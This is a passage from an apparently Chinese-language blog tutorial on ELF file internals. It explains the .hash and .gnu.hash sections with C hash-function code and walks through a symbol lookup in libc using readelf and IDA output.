class="line">  stapsdt              0x00000028       NT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">    Provider: Provider</span><br><span class="line">    Name: Probe</span><br><span class="line">    Location: 0x00000000004004da, Base: 0x0000000000400574, Semaphore: 0x0000000000000000</span><br><span class="line">    Arguments:</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<a href="https://sourceware.org/systemtap/wiki/UserSpaceProbeImplementation" target="_blank" rel="noopener">这里</a>有更多关于Systemtap如何实现SDT探针的信息。</p><p><code>参考</code>：<a href="https://libstapsdt.readthedocs.io/en/latest/how-it-works/internals.html" target="_blank" rel="noopener">libstapsdt - How Systemtap SDT works</a></p><h4 id="5-1-8-note-openbsd-ident"><a href="#5-1-8-note-openbsd-ident" class="headerlink" title="5.1.8 .note.openbsd.ident"></a>5.1.8 .note.openbsd.ident</h4><p>&emsp;&emsp;OpenBSD原生可执行文件通常包含此节(Section)来标识自己，因此内核可以在加载文件时绕过任何兼容性ELF二进制仿真测试。[^11]</p><h3 id="5-2-Hash-Related-Sections"><a href="#5-2-Hash-Related-Sections" class="headerlink" title="5.2 Hash Related Sections"></a>5.2 Hash Related Sections</h3><p>&emsp;&emsp;高版本GCC编译完的程序，一般只包含.gnu.hash节。我们可以使用如下参数编译程序，使其拥有两种或两种中的一种Hash表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc test.c -Wl,--hash-style=sysv -o test    # 只有.hash</span><br><span class="line">gcc test.c -Wl,--hash-style=gnu -o test     # 只有.gnu.hash</span><br><span class="line">gcc test.c -Wl,--hash-style=both -o test    # .hash和.gnu.hash都有</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;上面的命令行参数的意义如下：</p><blockquote><p><code>-Wl,&lt;options\&gt;</code>：传递以逗号分隔的选项给链接器(Linker)。<br><code>--hash-style=</code>：链接器(Linker)选项，设置链接器(Linker)给编译后的ELF文件添加的Hash表的类型。</p></blockquote><h4 id="5-2-1-Hash函数"><a href="#5-2-1-Hash函数" class="headerlink" title="5.2.1 Hash函数"></a>5.2.1 Hash函数</h4><p>&emsp;&emsp;符号名中@及其后的所有字符都不参与Hash计算。</p><p>&emsp;&emsp;使用下列命令，可以查看某种Hash算法在某一对象中的表现情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -I libc-2.23-64.so </span><br><span class="line"></span><br><span class="line">Histogram for bucket list length (total of 1017 buckets):</span><br><span class="line"> Length  Number     % of total  Coverage</span><br><span class="line">      0  622        ( 61.2%)</span><br><span class="line">      1  260        ( 25.6%)     46.7%</span><br><span class="line">      2  109        ( 10.7%)     85.8%</span><br><span class="line">      3  25         (  2.5%)     99.3%</span><br><span class="line">      4  1          (  0.1%)    100.0%</span><br><span class="line"></span><br><span class="line">Histogram for `.gnu.hash&apos; bucket list length (total of 1011 buckets):</span><br><span class="line"> Length  Number     % of total  Coverage</span><br><span class="line">      0  104        ( 10.3%)</span><br><span class="line">      1  232        ( 22.9%)     10.4%</span><br><span class="line">      2  286        ( 28.3%)     36.0%</span><br><span class="line">      3  208        ( 20.6%)     63.9%</span><br><span class="line">      4  120        ( 11.9%)     85.4%</span><br><span class="line">      5  41         (  4.1%)     94.5%</span><br><span class="line">      6  18         (  1.8%)     99.4%</span><br><span class="line">      7  2          (  0.2%)    100.0%</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;Length表具有相同(hash % nBucket)值的符号对应的Chains[]表元素形成的Chain中的元素数量，Number为某一Chain的数量，也是相应Buckets[]元素的数量(其保存Chain首元素的索引)。</p><h5 id="5-2-1-1-hash-Hash函数-1"><a href="#5-2-1-1-hash-Hash函数-1" class="headerlink" title="5.2.1.1 .hash Hash函数[^1]"></a>5.2.1.1 .hash Hash函数[^1]</h5><p>&emsp;&emsp;.hash使用的Hash函数是ELF Hash(Sysv Hash)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">elf_hash</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> h = <span class="number">0</span>, g;</span><br><span class="line">    <span class="keyword">while</span> (*name)</span><br><span class="line">    &#123;</span><br><span class="line">        h = (h &lt;&lt; <span class="number">4</span>) + *name++;     <span class="comment">// hash左移4位，把当前字符ASCII存入hash低8位。 </span></span><br><span class="line">        <span class="keyword">if</span> (g = h &amp; <span class="number">0xf0000000</span>)</span><br><span class="line">            <span class="comment">// 如果最高的四位不为0，则说明字符多余7个，现在正在存第7个字符，如果不处理，再加下一个字符时，第一个字符会被移出，因此要有如下处理。</span></span><br><span class="line">            <span class="comment">// 该处理，如果最高位为0，就会仅仅影响5-8位，否则会影响5-32位，因为C语言使用的算数移位。</span></span><br><span class="line">            <span class="comment">// 因为1-4位刚刚存储了新加入到字符的低4位，所以不能&gt;&gt;28。</span></span><br><span class="line">            <span class="comment">// 这行代码并不会对g有影响，g本身和hash的高4位相同。</span></span><br><span class="line">            h ^= g &gt;&gt; <span class="number">24</span>;</span><br><span class="line">        <span class="comment">// 下面这行代码&amp;~即对29-32位(高4位)清零。</span></span><br><span class="line">        h &amp;= ~g;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5-2-1-2-gnu-hash-Hash函数-8"><a href="#5-2-1-2-gnu-hash-Hash函数-8" class="headerlink" title="5.2.1.2 .gnu.hash Hash函数[^8]"></a>5.2.1.2 .gnu.hash Hash函数[^8]</h5><p>&emsp;&emsp;.gnu.hash使用的Hash函数是DJB Hash，该Hash算法由Bernstein(Daniel J Bernstein)教授在多年以前发表在comp.lang.c新闻组(usenet newsgroup):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> dl_new_hash(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> h = <span class="number">5381</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span> c = *s; c != <span class="string">'\0'</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;如果你在线搜索这个算法，你会发现表达式<code>“h = h * 33 + c”</code>以另一种方式表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h = ((h &lt;&lt; <span class="number">5</span>) + h) + c</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;它们是等价的语句，将整型乘法运算替换成成本更低的移位和加法运算。实际中是否能够降低成本取决于使用的CPU。对旧机器来说这两种形式将会有显著差异，但是对当代机器来说整型乘法运算相当的快。</p><p>&emsp;&emsp;该算法的另一种变化是将返回值剪切为31位:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> h &amp; <span class="number">0x7fffffff</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;然而，GNU Hash使用完整的32位无符号结果。</p><p>&emsp;&emsp;<a href="http://sourceware.org/ml/binutils/2006-10/msg00377.html" target="_blank" rel="noopener">GNU binutils实现</a>使用uint_fast32_t类型来计算哈希。此类型被定义为当前系统上能够表示至少32位的最快的可用整数型机器类型。由于可能使用更宽的类型实现，结果在返回之前被显式地剪切为32位的无符号值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> uint_fast32_t <span class="title">dl_new_hash</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint_fast32_t</span> h = <span class="number">5381</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span> c = *s; c != <span class="string">'\0'</span>; c = *++s)</span><br><span class="line">        h = h * <span class="number">33</span> + c;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> h &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-2-2-hash"><a href="#5-2-2-hash" class="headerlink" title="5.2.2 .hash"></a>5.2.2 .hash</h4><h5 id="5-2-2-1-hash表结构"><a href="#5-2-2-1-hash表结构" class="headerlink" title="5.2.2.1 .hash表结构"></a>5.2.2.1 .hash表结构</h5><p>&emsp;&emsp;标准哈希表(.hash)由链接器(Link Editor)构建。此节(Section)的节类型是SHT_HASH，使用的属性是SHF_ALLOC。动态节(Dynamic Section)中此节的节标记为DT_HASH。它的结构非常简单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Pseudo-C</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word nBucket;            <span class="comment">/* Number of buckets */</span></span><br><span class="line">    Elf32_Word nChain;             <span class="comment">/* Numer of entries in .dynsym */</span></span><br><span class="line">    Elf32_Word Buckets[nbucket];   <span class="comment">/* First entry in the chain */</span></span><br><span class="line">    Elf32_Word Chains[nchain];     <span class="comment">/* Next entry in the chain */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf64_Word nBucket;            <span class="comment">/* Number of buckets */</span></span><br><span class="line">    Elf64_Word nChain;             <span class="comment">/* Numer of entries in .dynsym */</span></span><br><span class="line">    Elf64_Word Buckets[nbucket];   <span class="comment">/* First entry in the chain */</span></span><br><span class="line">    Elf64_Word Chains[nchain];     <span class="comment">/* Next entry in the chain */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;哈希表(Hash Table)由Elf32_Word或Elf64_Word对象组成，其提供对符号表(Symbol Table)的访问。与哈希表(Hash Table)中哈希相关联的符号表(Symbol Table)在哈希表的节头(Section Header)的sh_link条目中指定。下图中使用标签来帮助解释哈希表(Hash Table)的组织形式，但这些标签不是此规范的一部分。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_5-3：Symbol_Hash_Table.png" alt="Figure 5-3：Symbol Hash Table"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 5-3：Symbol Hash Table</p><p>&emsp;&emsp;Buckets表包含nBucket个项，Chains表包含nChain个项。索引从0开始。Buckets和Chains都保存符号表索引。Chains表项与符号表(Symbol Table)项是平行的。符号表项的数量应等于nChain，因此符号表索引也可以索引Chains表项。</p><p>&emsp;&emsp;一个接受符号名称的Hash函数，返回一个值来计算Bucket表索引。因此，如果Hash函数返回某个符号名称的hash值，通过Buckets[hash % nBucket]可以得到一个索引index。该索引是符号表和Chain表的索引。如果符号表项不包含所需的符号名称，Chains[index]给出具有相同(hash % nBucket)值的下一个符号的符号表项索引。</p><p>&emsp;&emsp;可以跟踪Chain链，直到所选符号表项包含所需名称，或者Chain表项包含值STN_UNDEF。这个特殊的索引值表示Chain的结尾，意味着在Chain表中找不到更多的符号表索引。[^6]</p><blockquote><p><strong><code>总结如下</code></strong>：<br><code>Buckets[hash % nBucket]</code>：给出动态符号表(Dynamic Symbol Table)符号项的索引或Chains数组的初始索引。根据动态链接符号的数量来获得。(binutils/bfd/elflink.c有具体细节)<br><code>Chains[index]</code>：给出Chains[]中的下一个项的索引(与前一项具有相同的(hash % nBucket)值)。<br><code>index</code>：STN_UNDEF标记Chain的结尾(具有相同Hash值的符号对应的Chains[]元素形成的Chain)。</p></blockquote><p><code>参考</code>：binutils/bfd/elflink.c有具体细节，bfd_elf_size_dynsym_hash_dynstr()。</p><p>&emsp;&emsp;查找过程是这样的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">const</span> Elf64_Sym* <span class="title">lookup_symbol</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* symbol,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Elf64_Sym* symbol_table</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> <span class="keyword">char</span>* string_table,</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">const</span> Elf32_Word* hash_table)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Elf32_Word nbucket           = hash_table[<span class="number">0</span>];</span><br><span class="line">    Elf32_Word nchain            = hash_table[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">const</span> Elf32_Word* buckets    = hash_table + <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> Elf32_Word* chains     = hash_table + <span class="number">2</span> + nbucket;</span><br><span class="line">    Elf32_Word index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = elf_hash(symbol_name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Iterate on the chain:</span></span><br><span class="line">    <span class="keyword">for</span>(index = buckets[hash % nbucket]; chains[index] != STN_UNDEF; index = chains[index])</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(symbol, string_table + symbol_table[index].st_name) == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> symbol_table + index;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="5-2-2-2-符号查找实例"><a href="#5-2-2-2-符号查找实例" class="headerlink" title="5.2.2.2 符号查找实例"></a>5.2.2.2 符号查找实例</h5><p>&emsp;&emsp;首先我们写一个计算符号名Hash的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc hash.c -o hash</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">elf_hash</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> h = <span class="number">0</span>, g;</span><br><span class="line">    <span class="keyword">while</span> (*name)</span><br><span class="line">    &#123;</span><br><span class="line">        h = (h &lt;&lt; <span class="number">4</span>) + *name++;</span><br><span class="line">        <span class="keyword">if</span> (g = h &amp; <span class="number">0xf0000000</span>)</span><br><span class="line">            h ^= g &gt;&gt; <span class="number">24</span>;</span><br><span class="line">        h &amp;= ~g;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%X\n"</span>, elf_hash(argv[<span class="number">1</span>]));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;这里使用libc6_2.23-0ubuntu11.2_amd64的libc-2.23-64.so(我重命名了)来做测试，使用64位的程序，主要是为了证明不管是32位程序还是64位程序，通过ELF Hash来进行符号查找，Hash的位数都是32位，而且.hash表中的内容由Elf32_Word(32位)或Elf64_Word(32位)对象组成。我们随便找一个示例程序中的符号来进行测试，以“putwchar”为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libc-2.23-64.so </span><br><span class="line"></span><br><span class="line">Symbol table &apos;.dynsym&apos; contains 2245 entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     1: 000000000001f8b0     0 SECTION LOCAL  DEFAULT   13 </span><br><span class="line">     2: 00000000003c07c0     0 SECTION LOCAL  DEFAULT   23 </span><br><span class="line">     3: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global@GLIBC_PRIVATE (26)</span><br><span class="line">     4: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND __libc_enable_secure@GLIBC_PRIVATE (26)</span><br><span class="line">     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __tls_get_addr@GLIBC_2.3 (27)</span><br><span class="line">     6: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _rtld_global_ro@GLIBC_PRIVATE (26)</span><br><span class="line">     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND _dl_find_dso_for_object@GLIBC_PRIVATE (26)</span><br><span class="line">     8: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _dl_starting_up</span><br><span class="line">     9: 0000000000000000     0 OBJECT  GLOBAL DEFAULT  UND _dl_argv@GLIBC_PRIVATE (26)</span><br><span class="line">    10: 0000000000071100   349 FUNC    GLOBAL DEFAULT   13 putwchar@@GLIBC_2.2.5    &lt;----</span><br><span class="line">    11: 000000000009ec20    32 FUNC    GLOBAL DEFAULT   13 __strspn_c1@@GLIBC_2.2.5</span><br><span class="line">    12: 00000000001187e0    16 FUNC    GLOBAL DEFAULT   13 __gethostname_chk@@GLIBC_2.4</span><br><span class="line">    13: 000000000009ec40    37 FUNC    GLOBAL DEFAULT   13 __strspn_c2@@GLIBC_2.2.5</span><br><span class="line">    [...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;从上面的输出信息中，我们可以知道动态符号表(Dynamic Symbol Table)总共有2245项，符号“putwchar”的索引为10。通过上面计算Hash的函数进行计算“putwchar”的Hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ./hash putwchar</span><br><span class="line">CBD99F2</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;接下来，我们需要计算Bucket表索引，使用Bucket[hash % nBucket]公式。所以我们需要知道nBucket的值。我们将libc-2.23-64.so使用IDA打开，找到.hash节所在位置，IDA不能很好地识别.hash，所以需要我们自己添加一个Section，并使用IDA Python脚本对.hash节的内容进行解析，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.hash:001BC8A8 _hash segment byte public &apos;&apos; use32</span><br><span class="line">.hash:001BC8A8       assume cs:_hash</span><br><span class="line">.hash:001BC8A8       ;org 1BC8A8h</span><br><span class="line">.hash:001BC8A8       assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">.hash:001BC8A8       dd 3F9h                 ; nbucket</span><br><span class="line">.hash:001BC8AC       dd 8C5h                 ; nchain</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">.hash:001BC8B0       dd 1D5h, 30Ah, 88Bh, 400h, 59Dh, 2BDh, 0, 0B0h, 658h, 66Ah, 0A6h, 416h, 118h, 468h, 18Bh, 6E2h     ; 0  ; bucket</span><br><span class="line">.hash:001BC8B0       dd 1D1h, 3C4h, 779h, 5EAh, 441h, 543h, 0, 2DBh, 753h, 0, 77Dh, 5D3h, 6BFh, 3E2h, 3CCh, 5F2h        ; 10h</span><br><span class="line">.hash:001BC8B0       dd 141h, 0, 872h, 83Fh, 72h, 6CBh, 564h, 7BFh, 8BEh, 71Dh, 453h, 40Eh, 726h, 5A4h, 7A3h, 4Dh       ; 20h</span><br><span class="line">[...]</span><br><span class="line">.hash:001BC8B0       dd 6DCh, 27Dh, 6F5h, 66Ch, 275h, 530h, 74h, 0Ah, 828h, 2D6h, 34Ch, 5A6h, 72Ah, 3CEh, 663h, 6EAh    ; 100h</span><br><span class="line">.hash:001BC8B0       dd 0, 0, 391h, 7E4h, 793h, 636h, 0, 718h, 4DBh, 881h, 2EDh, 780h, 242h, 1A1h, 486h, 2FCh           ; 110h</span><br><span class="line">.hash:001BC8B0       dd 21Dh, 73Fh, 54Ch, 0, 745h, 0, 413h, 26Bh, 53h, 44h, 94h, 2FDh, 0, 3, 50Eh, 7BEh                 ; 120h</span><br><span class="line">[...]</span><br><span class="line">.hash:001BC8B0       dd 7C4h, 3E8h, 5CAh, 80Fh, 0, 4E4h, 48Fh, 386h, 0, 0, 7ACh, 0B6h, 0, 5C2h, 1C7h, 30Eh              ; 3D0h</span><br><span class="line">.hash:001BC8B0       dd 1A6h, 738h, 7Ch, 6D4h, 1B7h, 14h, 68Bh, 4DAh, 3DDh, 6Ch, 62h, 30h, 3FDh, 4E7h, 7CEh, 4C7h       ; 3E0h</span><br><span class="line">.hash:001BC8B0       dd 32Ch, 669h, 487h, 7A8h, 7F4h, 301h, 599h, 0, 35Ch                                               ; 3F0h</span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">.hash:001BD894       dd 0, 0, 0, 0, 0, 0, 0, 32Dh, 0, 0, 3E6h, 3BEh, 102h, 79Ch, 510h, 6CCh                             ; 0 ; chain</span><br><span class="line">.hash:001BD894       dd 0, 0, 0, 0, 33h, 81Eh, 0, 0, 177h, 0BBh, 0, 0, 3E3h, 532h, 0, 0                                 ; 10h</span><br><span class="line">.hash:001BD894       dd 552h, 3B6h, 861h, 0, 23h, 0, 7B9h, 63Ch, 0, 0, 0, 5DCh, 0, 0, 313h, 723h                        ; 20h</span><br><span class="line">[...]</span><br><span class="line">.hash:001BD894       dd 0, 367h, 473h, 19Fh, 0, 804h, 1F2h, 0, 1D7h, 47Ch, 499h, 7Ah, 857h, 491h, 65Ah, 74Fh            ; 8A0h</span><br><span class="line">.hash:001BD894       dd 0, 0, 71Fh, 0, 210h, 0, 0, 372h, 4B8h, 0, 0, 29Eh, 727h, 0, 276h, 0                             ; 8B0h</span><br><span class="line">.hash:001BD894       dd 3CDh, 640h, 0, 86h, 28Dh                                                                        ; 8C0h</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以知道nBucket为0x3F9=1017，nChain为0x8C5=2245。nChain等于动态符号表(Dynamic Symbol Table)的项数。接下来我们计算Bucket表索引，并得到对应Bucket表项的值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bucket[hash % nBucket] = Bucket[0xCBD99F2 % 0x3F9] = Bucket[0x107] = 0x0Ah = 10</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;我们可以看到Bucket数组相应表项的内容就是所查找符号在动态符号表(Dynamic Symbol Table)中的索引。</p><p>&emsp;&emsp;我们可以使用如下命令查看符号表中符号索引与Buckets[]数组索引的对应关系：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -sD libc-2.23-64.so </span><br><span class="line"></span><br><span class="line">Symbol table for image:</span><br><span class="line">  Num Buc:    Value          Size   Type   Bind Vis      Ndx Name</span><br><span class="line">  469   0: 00000000000ace20   530 FUNC    GLOBAL DEFAULT  13 __mbrtowc</span><br><span class="line">  949   0: 00000000000fe6a0    89 FUNC    GLOBAL DEFAULT  13 __setmntent</span><br><span class="line"> 1604   0: 0000000000034ee0    55 FUNC    WEAK   DEFAULT  13 isnanl</span><br><span class="line">  778   1: 000000000002d800   187 FUNC    WEAK   DEFAULT  13 freelocale</span><br><span class="line">   33   1: 0000000000117db0   231 FUNC    GLOBAL DEFAULT  13 __vswprintf_chk</span><br><span class="line">  950   1: 00000000001025a0   219 FUNC    WEAK   DEFAULT  13 hcreate_r</span><br><span class="line"> 2187   2: 00000000000ea7e0    22 FUNC    GLOBAL DEFAULT  13 getopt_long_only</span><br><span class="line"> 1024   3: 0000000000131cc0   197 FUNC    GLOBAL DEFAULT  13 endrpcent</span><br><span class="line">  472   3: 0000000000115050    38 FUNC    GLOBAL DEFAULT  13 pthread_mutex_lock</span><br><span class="line"> 2222   3: 00000000003c4b00     8 OBJECT  WEAK   DEFAULT  33 __memalign_hook</span><br><span class="line"> 1626   3: 0000000000034b60    33 FUNC    WEAK   DEFAULT  13 isinff</span><br><span class="line"> 1437   4: 00000000000fca50    33 FUNC    WEAK   DEFAULT  13 setrlimit</span><br><span class="line">  701   5: 000000000010b6e0   188 FUNC    GLOBAL DEFAULT  13 getspent</span><br><span class="line"> 1714   5: 0000000000107530     7 FUNC    WEAK   DEFAULT  13 umount</span><br><span class="line"> 2090   5: 0000000000096a90    69 FUNC    GLOBAL DEFAULT  13 __argz_count</span><br><span class="line">  400   5: 0000000000127800   161 FUNC    GLOBAL DEFAULT  13 __res_nclose</span><br><span class="line">  176   7: 000000000008d8f0   524 FUNC    GLOBAL DEFAULT  13 strsignal</span><br><span class="line"> 1078   7: 000000000007bfb0    54 FUNC    GLOBAL DEFAULT  13 _IO_sungetc</span><br><span class="line"> 1624   8: 000000000009eaa0   159 FUNC    GLOBAL DEFAULT  13 __stpcpy_small</span><br><span class="line">  427   8: 0000000000106190    33 FUNC    GLOBAL DEFAULT  13 